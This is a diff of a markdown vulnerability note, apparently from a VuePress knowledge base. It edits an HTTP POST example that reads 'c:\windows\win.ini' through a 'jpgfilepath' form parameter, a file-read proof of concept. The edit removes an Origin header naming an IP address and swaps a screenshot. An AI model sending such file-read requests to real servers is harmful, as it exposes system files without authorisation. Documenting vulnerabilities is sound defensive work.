@@ -30,10 +30,9 @@ Host:
 Content-Length: 55
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://114.251.113.53:7002
 Content-Type: application/x-www-form-urlencoded
 
 jpgfilepath=c:\windows\win.ini
 ```
 
-![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313145950746.png)
+![image-20220321114620970](../../../.vuepress/public/img/image-20220321114620970.png)
